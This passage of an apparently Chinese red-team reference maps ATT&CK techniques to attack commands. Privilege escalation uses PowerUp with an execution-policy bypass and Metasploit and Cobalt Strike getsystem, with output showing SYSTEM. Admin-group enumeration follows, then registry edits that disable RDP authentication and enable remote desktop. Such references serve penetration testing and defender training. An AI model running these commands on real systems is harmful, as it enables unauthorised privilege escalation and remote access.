<p><a target="_blank" rel="noopener noreferrer" href="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f30303746384767426c7931673671796a6c37326f766a33306f7730387a7a6b6c2e6a7067"><img src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f30303746384767426c7931673671796a6c37326f766a33306f7730387a7a6b6c2e6a7067" alt="截图_2019-09-07_14-53-28.png" data-canonical-src="http://ww1.sinaimg.cn/large/007F8GgBly1g6qyjl72ovj30ow08zzkl.jpg" style="max-width:100%;"></a></p>
<h2><a id="user-content-service-registry-permissions-weakness注册权限不足" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#service-registry-permissions-weakness%E6%B3%A8%E5%86%8C%E6%9D%83%E9%99%90%E4%B8%8D%E8%B6%B3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Service Registry Permissions Weakness(注册权限不足)</h2>
<h3><a id="user-content-check-for-common-privilege-escalation-methods-1" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#check-for-common-privilege-escalation-methods-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Check for common privilege escalation methods</h3>
<h4><a id="user-content-termianal下操作" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#termianal%E4%B8%8B%E6%93%8D%E4%BD%9C"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>termianal下操作：</h4>
<blockquote>
<p>powershell.exe -epbypass PowerUp.ps1</p>
<p>Invoke-AllChecks</p>
</blockquote>
<h4><a id="user-content-msf下操作-16" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-16"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>exploit/windows/local/trusted_service_path</p>
</blockquote>
<h4><a id="user-content-cs下操作-21" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-21"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>powershell-import /path/to/PowerUp.ps1</p>
<p>powershell Invoke-AllChecks</p>
</blockquote>
<h2><a id="user-content-exploitation-for-privilege-escalation利用漏洞提权" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#exploitation-for-privilege-escalation%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Exploitation for Privilege Escalation(利用漏洞提权)</h2>
<h3><a id="user-content-elevate-to-system-level-process提权至system" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#elevate-to-system-level-process%E6%8F%90%E6%9D%83%E8%87%B3system"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Elevate to SYSTEM level process（提权至system）</h3>
<h4><a id="user-content-msf下操作-17" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-17"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>getsystem</p>
</blockquote>
<p>getsystem工作原理：</p>
<ul>
<li>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。</li>
<li>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。</li>
<li>③Windows服务已启动，导致与命名管道建立连接。</li>
<li>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。</li>
</ul>
<p>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程</p>
<p>有三种工作方式</p>
<pre><code>0 : All techniques available
	1 : Named Pipe Impersonation (In Memory/Admin)1:命名管道模拟(在内存/管理中)
	2 : Named Pipe Impersonation (Dropper/Admin)2:命名管道模拟(Dropper/Admin)
	3 : Token Duplication (In Memory/Admin)3:令牌复制(在内存/管理中)
</code></pre>
<pre><code>meterpreter &gt; getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; whoami
[-] Unknown command: whoami.
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM

</code></pre>
<h4><a id="user-content-cs下操作-22" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-22"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>getsystem</p>
</blockquote>
<pre><code>beacon&gt; getsystem
[*] Tasked beacon to get SYSTEM
[+] host called home, sent: 100 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
</code></pre>
<h2><a id="user-content-permission-groups-discovery权限组发现" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#permission-groups-discovery%E6%9D%83%E9%99%90%E7%BB%84%E5%8F%91%E7%8E%B0"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Permission Groups Discovery（权限组发现）</h2>
<h3><a id="user-content-enumerate-local-admin-accounts本地账户枚举" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#enumerate-local-admin-accounts%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E6%9E%9A%E4%B8%BE"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enumerate local Admin accounts（本地账户枚举）</h3>
<h4><a id="user-content-terminal下操作-18" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-18"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net localgroup "Administrators"</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> net localgroup <span class="pl-s"><span class="pl-pds">"</span>Administrators<span class="pl-pds">"</span></span>
别名     Administrators
注释     管理员对计算机/域有不受限制的完全访问权

成员

-------------------------------------------------------------------------------
Administrator
命令成功完成。
</pre></div>
<h4><a id="user-content-msf下操作-18" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-18"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>post/windows/gather/local_admin_search_enum</p>
</blockquote>
<pre><code>msf5 post(windows/gather/local_admin_search_enum) &gt; exploit 

[-] Running as SYSTEM, module should be run with USER level rights
[*] Scanned 1 of 1 hosts (100% complete)
[*] Post module execution completed

</code></pre>
<h4><a id="user-content-cs下操作-23" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-23"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell net localgroup "Administrators"</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell net localgroup <span class="pl-s"><span class="pl-pds">"</span>Administrators<span class="pl-pds">"</span></span>
[<span class="pl-k">*</span>] Tasked beacon to run: net localgroup <span class="pl-s"><span class="pl-pds">"</span>Administrators<span class="pl-pds">"</span></span>
[+] host called home, sent: 62 bytes
[-] could not spawn C:<span class="pl-cce">\W</span>INDOWS<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\c</span>md.exe /C net localgroup <span class="pl-s"><span class="pl-pds">"</span>Administrators<span class="pl-pds">"</span></span> (token): 1349
</pre></div>
<h3><a id="user-content-get-domain-admin-accounts域管理账户枚举" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-domain-admin-accounts%E5%9F%9F%E7%AE%A1%E7%90%86%E8%B4%A6%E6%88%B7%E6%9E%9A%E4%B8%BE"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get domain admin accounts(域管理账户枚举)</h3>
<h4><a id="user-content-terminal下操作-19" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-19"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net group ["Domain Admins"] /domain[:DOMAIN]</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> net group /domain
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系。
</pre></div>
<h4><a id="user-content-msf下操作-19" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-19"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>post/windows/gather/enum_domain_group_users</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 post(windows/gather/enum_domain_group_users) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Running module against ROOT-5DE52AC98B
[-] Post failed: NoMethodError undefined method <span class="pl-s"><span class="pl-pds">`</span>each<span class="pl-s"><span class="pl-pds">'</span> for nil:NilClass</span></span>
<span class="pl-s"><span class="pl-s">[-] Call stack:</span></span>
<span class="pl-s"><span class="pl-s">[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_domain_group_users.rb:77:in `get_members<span class="pl-pds">'</span></span></span>
<span class="pl-s">[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_domain_group_users.rb:42:in <span class="pl-pds">`</span></span>run<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[*] Post module execution completed</span>
<span class="pl-s"></span>
<span class="pl-s"></span></pre></div>
<h4><a id="user-content-cs下操作-24" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-24"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>net group ["Domain Admins"] /domain</p>
</blockquote>
<h2><a id="user-content-remote-desktop-protocol" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#remote-desktop-protocol"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Remote Desktop Protocol</h2>
<h3><a id="user-content-enable-rdp-services开启rdp服务" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#enable-rdp-services%E5%BC%80%E5%90%AFrdp%E6%9C%8D%E5%8A%A1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enable RDP Services(开启RDP服务)</h3>
<h4><a id="user-content-terminal下操作-20" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-20"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<pre><code>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 

net start TermService
</code></pre>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> REG ADD <span class="pl-s"><span class="pl-pds">"</span>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations<span class="pl-cce">\</span></span>
<span class="pl-s">RDP-Tcp<span class="pl-pds">"</span></span> /v UserAuthentication /t REG_DWORD /d 0 /f
操作成功完成。
PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> reg add <span class="pl-s"><span class="pl-pds">"</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serve</span>
<span class="pl-s">r<span class="pl-pds">"</span></span> /v fDenyTSConnections /t REG_DWORD /d 0 /f
操作成功完成。
PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> net start TermService
请求的服务已经启动。

请键入 NET HELPMSG 2182 以获得更多的帮助。
</pre></div>
<p>####　msf下操作：</p>
<blockquote>
<p>post/windows/manage/enable_rdp</p>
</blockquote>
<pre><code>msf5 post(windows/manage/enable_rdp) &gt; exploit 

[*] Enabling Remote Desktop
[*] 	RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[*] 	Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20190907201411_default_192.168.2.114_host.windows.cle_731683.txt
[*] Post module execution completed

</code></pre>
